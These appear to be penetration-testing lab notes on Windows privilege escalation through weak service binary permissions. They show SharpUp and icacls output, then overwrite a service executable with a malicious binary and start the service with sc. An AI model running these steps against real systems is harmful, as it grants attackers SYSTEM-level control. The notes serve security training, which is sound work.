Sometimes for some files in window system the permission is configured in a way that is too weak / lax, this would become a problem threatening security if such said files were to be executed by privileged accounts.

Privilege Escalation by weak file permission:

After we gain access to the system, we can use SharpUp https://github.com/GhostPack/SharpUp/from GhostPack Suite to check for service binaries with weak ACL:
```
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  ...
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  <snip>
```

We noticed that we can modify this SecurityService binaries, we first need to verify whether we can really modify it before taking action:
```
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We confirmed that everyone have full control over this binary, inherited from parent folder.

Next, we first make a copy of this binaries (SecurityService.exe -> SecurityServicebackup.exe ), it is very important as we never know if the binaries we are modifying are unique or essential to business.

Then we generate a malicious binary with msfvenom with the same name, then place in the same directory, then we use sc to start service.
```
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

Privilege Escalation via Weak Service Escalation